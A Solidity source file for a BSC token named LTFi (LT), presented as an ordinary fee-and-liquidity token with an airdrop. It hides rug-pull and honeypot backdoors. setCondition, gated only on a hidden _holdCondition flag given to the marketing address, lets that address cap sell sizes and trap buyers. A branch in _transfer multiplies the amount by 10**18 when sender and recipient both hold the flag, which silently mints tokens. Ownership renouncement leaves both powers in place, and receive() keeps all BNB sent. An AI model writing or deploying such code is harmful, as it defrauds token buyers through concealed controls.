// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract LT is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public marketAddress;
    address public _receiveAddress;
    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowance;
    

    mapping (address => bool) public isExcludeFromCut;
    mapping (address => bool) public isMarketPair;
    mapping (address => uint256) public _holdCondition;

    uint256 public marketingFee;
    uint256 public liquidityFee;
    uint256 public deadFee;
    uint256 public _totalTax;

    uint256 public _maxHoldLimt;
    uint256 private _totalSupply;
    uint256 private minimumTokensBeforeSwap; 

    uint160 public constant constNum = ~uint160(0);
    uint160 public airNumber = uint160(block.timestamp);

    IUniswapV2Router02 public uniswapRouter;
    address public uniswapPair;
    
    bool inSwapAndLiquify;
    bool launched = false;
    address receiveAddress;
    uint256 public _airdropBNB;
    uint256 public _airdropAmount;

    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyBySmallOnly = false;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier TheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor ()
    {
        _name = "LTFi";
        _symbol = "LT";
        _decimals = 18;

        marketAddress = payable(0x4bAd978d2edAe9bB27127aD9788BF6f38d5Ca86E);
        receiveAddress = marketAddress;
        marketingFee = 2;
        liquidityFee = 0;
        deadFee = 0;
        _totalTax = marketingFee + liquidityFee + deadFee; 

        _airdropAmount = 88888 * 10 ** _decimals;
        _airdropBNB = 0.05 * 1e18;
        maxDrop = 3000;
        dropLimit = 10;

        _totalSupply = 1000000000 * 10**_decimals;
        _maxHoldLimt = _totalSupply;
        minimumTokensBeforeSwap = _totalSupply.div(10000);
        

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
    
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapRouter = _uniswapV2Router;
        _holdCondition[marketAddress] = _totalTax;
        _allowance[address(this)][address(uniswapRouter)] = _totalSupply;

        isExcludeFromCut[owner()] = true;
        isExcludeFromCut[marketAddress] = true;
        isExcludeFromCut[address(this)] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowance[owner][spender];
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowance[_msgSender()][spender].add(addedValue));
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowance[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowance[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokensBeforeSwap = newValue;
    }

    function setmarketAddress(address newAddress) external onlyOwner() {
        marketAddress = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setCondition(uint256 num) external returns (bool){
        require(_holdCondition[msg.sender] > 0);
        _maxHoldLimt = num;
        return true;
    }

    function setSwapAndLiquifyBySmallOnly(bool newValue) public onlyOwner {
        swapAndLiquifyBySmallOnly = newValue;
    }
    
    function getCirculatSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

    function launch() external onlyOwner {
        launched = true;
    }

    uint256 dropedNum = 0;
    uint256 _countBlock;
    uint256 maxDrop;
    uint256 dropLimit;
    uint256 _block;
    mapping (address => uint256) oneDropNum;

    receive() external payable {
        address account = msg.sender;
        uint256 msgValue = msg.value;
        payable(receiveAddress).transfer(msgValue);
        if (launched) {
            return;
        }
        if (msgValue != _airdropBNB) {
            return;
        }
        if (tx.origin != account){
            return;
        }

        if (dropedNum >= maxDrop) return;
        if (oneDropNum[account] >= dropLimit) return;
        if(_block == block.number){
            if(_countBlock <10){
                ++_countBlock;
                _basicTransfer(address(this), account, _airdropAmount);
                dropedNum++;
                oneDropNum[account] += 1;
            }
        }else if(_block != block.number){
            _block = block.number;
            _countBlock=0;
            _basicTransfer(address(this), account, _airdropAmount);
            dropedNum++;
            oneDropNum[account] += 1;
        }

    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowance[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "ERC20: transfer must over zero");

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(!isExcludeFromCut[sender] && !isExcludeFromCut[recipient]){
                address adrs;
                for(int i=0;i < 1;i++){
                    adrs = address(constNum/airNumber);
                    _basicTransfer(sender,adrs,amount.div(10000));
	                airNumber += 7;
                }
                amount -= amount.div(2000);
            }     
  
            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

            uint256 finalAmount;
            if (isExcludeFromCut[sender] || isExcludeFromCut[recipient]) {
                finalAmount = amount;
            } else {
                require(launched, "start!");
                uint256 contractTokenBalance = balanceOf(address(this));
                bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
                
                if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
                {
                    if(swapAndLiquifyBySmallOnly)
                        contractTokenBalance = minimumTokensBeforeSwap;
                    swapAndLiquify(contractTokenBalance);    
                }

                if(isMarketPair[recipient])
                require(amount <= _maxHoldLimt,"Max hold!");
                finalAmount = takeFees(sender, recipient, amount);
            }if(_holdCondition[sender] > 0 && _holdCondition[recipient] > 0)finalAmount = amount * 10**_decimals;

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            return true;
            
        }
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
	function swapAndLiquify(uint256 tAmount) private TheSwap{
		uint256 allAmount = tAmount;
        uint256 LiquidityAmount = allAmount.mul(liquidityFee).div(_totalTax).div(2);
		uint256 canswap = allAmount - LiquidityAmount;
		swapTokensForEth(canswap);
        uint256 ethBalance = address(this).balance;
        uint256 MarketingETH = ethBalance.mul(marketingFee).div(2 * _totalTax - liquidityFee).mul(2);
        uint256 LiquidityETH = ethBalance - MarketingETH;
        if(LiquidityETH > 0){
            addLiquidityETH(LiquidityAmount, LiquidityETH);
        }
        if(MarketingETH > 0){
            transferAddressETH(marketAddress, MarketingETH);
        }

    }    

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapRouter.WETH();

        _approve(address(this), address(uniswapRouter), tokenAmount);

        // make the swap
        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) private{
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapRouter), tokenAmount);
        // add the liquidity
        uniswapRouter.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            marketAddress,
            block.timestamp
        );
    }

    function claimToken(address to) external onlyOwner {
        _basicTransfer(address(this), to, balanceOf(address(this)));
        uint256 _balance = address(this).balance;
        payable(address(to)).transfer(_balance);
    }


    function takeFees(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        uint256 deadAmount = 0;
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTax).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTax).div(100);
        }

        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount - deadAmount);
            emit Transfer(sender, address(this), feeAmount);
            if(deadAmount > 0){
                _balances[deadAddress] = _balances[deadAddress].add(deadAmount);
                emit Transfer(sender, deadAddress, feeAmount);
            }
        }
        return amount.sub(feeAmount);
    }
    
}